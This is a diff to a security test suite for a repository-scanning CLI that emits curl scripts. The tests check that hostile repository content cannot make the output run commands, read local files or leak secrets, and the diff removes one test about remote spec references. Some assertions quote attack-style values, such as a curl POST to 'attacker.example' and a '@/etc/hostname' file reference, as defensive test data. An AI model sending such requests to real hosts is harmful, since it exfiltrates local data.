@@ -1,10 +1,8 @@
 import { spawnSync } from "node:child_process";
-import { chmodSync, existsSync, mkdirSync, symlinkSync, writeFileSync } from "node:fs";
-import { createServer } from "node:http";
-import type { AddressInfo } from "node:net";
+import { chmodSync, existsSync, symlinkSync, writeFileSync } from "node:fs";
 import path from "node:path";
 import { afterAll, describe, expect, it } from "vitest";
-import { cli, cliAsync, removeTempDirs, scanJson, schemaErrors, tempRepo } from "./helpers.js";
+import { cli, removeTempDirs, scanJson, schemaErrors, tempRepo } from "./helpers.js";
 
 afterAll(removeTempDirs);
 
@@ -35,7 +33,7 @@ describe("output a hostile repository chooses", () => {
   it.skipIf(!posix)("curl output runs as a script without running anything but curl", () => {
     const bin = tempRepo({ curl: "#!/bin/sh\nexit 0\n" });
     chmodSync(path.join(bin, "curl"), 0o755);
-    const run = cli(["scan", repo, "--curl", "--min-confidence", "0"]);
+    const run = cli(["scan", repo, "--curl"]);
     expect(run.status).not.toBe(1);
     const script = run.stdout;
     const r = spawnSync("sh", ["-c", script], { env: { PATH: `${bin}:/usr/bin:/bin` }, encoding: "utf8" });
@@ -46,7 +44,7 @@ describe("output a hostile repository chooses", () => {
 
   it("never prints control characters to the terminal", () => {
     for (const args of [[], ["--curl"]]) {
-      const r = cli(["scan", repo, "--min-confidence", "0", ...args]);
+      const r = cli(["scan", repo, ...args]);
       expect(r.status).toBe(0);
       expect(r.stdout).toContain("\\u001b]0;title\\u0007");
       // eslint-disable-next-line no-control-regex -- the assertion is about control characters
@@ -55,7 +53,7 @@ describe("output a hostile repository chooses", () => {
   });
 
   it("makes curl send values as written, never read local files", () => {
-    const script = cli(["scan", repo, "--curl", "--min-confidence", "0"]).stdout;
+    const script = cli(["scan", repo, "--curl"]).stdout;
     expect(script).toContain("--form-string 'file=@/etc/hostname'");
     expect(script).toContain("--form-string 'purpose=<notes.txt'");
     expect(script).toMatch(/curl -X POST 'https:\/\/attacker\.example\/raw'[^#]*--data-raw '/);
@@ -88,7 +86,7 @@ describe("credentials written in the code", () => {
       ].join("\n"),
     });
     for (const args of [["--json"], ["--curl"], []]) {
-      const out = cli(["scan", repo, "--min-confidence", "0", ...args]).stdout;
+      const out = cli(["scan", repo, ...args]).stdout;
       for (const secret of ["hunter2", "plainTok3n", "SuperSecret123", "cs_abcdef"]) expect(out, `${args.join(" ")} ${secret}`).not.toContain(secret);
       expect(out).toContain("api.example.com");
     }
@@ -155,34 +153,5 @@ describe.skipIf(!posix)("git", () => {
     expect(existsSync(out)).toBe(false);
     expect(cli(["scan", repo, "--changed-since", "HEAD", "--json"]).status).toBe(0);
     expect(existsSync(marker)).toBe(false);
-  });
-});
-
-describe("specs", () => {
-  it("never fetches a remote $ref or reads one outside the specs directory", async () => {
-    let requests = 0;
-    const server = createServer((_req, res) => {
-      requests++;
-      res.end("{}");
-    });
-    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
-    const port = (server.address() as AddressInfo).port;
-    const repo = tempRepo({
-      "pay.ts": `export const p = () => fetch("https://api.stripe.com/v1/customers", { method: "POST", body: JSON.stringify({ email: "a" }) });`,
-      "gh.ts": `export const g = () => fetch("https://api.github.com/user/repos", { method: "POST", body: JSON.stringify({ name: "a" }) });`,
-      "outside.json": `{ "type": "object" }`,
-    });
-    const specs = path.join(repo, "specs");
-    mkdirSync(specs);
-    const spec = (p: string, ref: string): string =>
-      JSON.stringify({ openapi: "3.0.0", info: { title: "t", version: "1" }, paths: { [p]: { post: { requestBody: { content: { "application/json": { schema: { $ref: ref } } } }, responses: {} } } } });
-    writeFileSync(path.join(specs, "stripe.json"), spec("/v1/customers", `http://127.0.0.1:${port}/s.json`));
-    writeFileSync(path.join(specs, "github.json"), spec("/user/repos", "../outside.json"));
-    const r = await cliAsync(["scan", repo, "--specs", specs, "--validate", "--json"]);
-    server.close();
-    expect(r.status).toBe(0);
-    expect(r.stderr).toContain("cannot read spec stripe.json");
-    expect(r.stderr).toContain("cannot read spec github.json");
-    expect(requests).toBe(0);
   });
 });
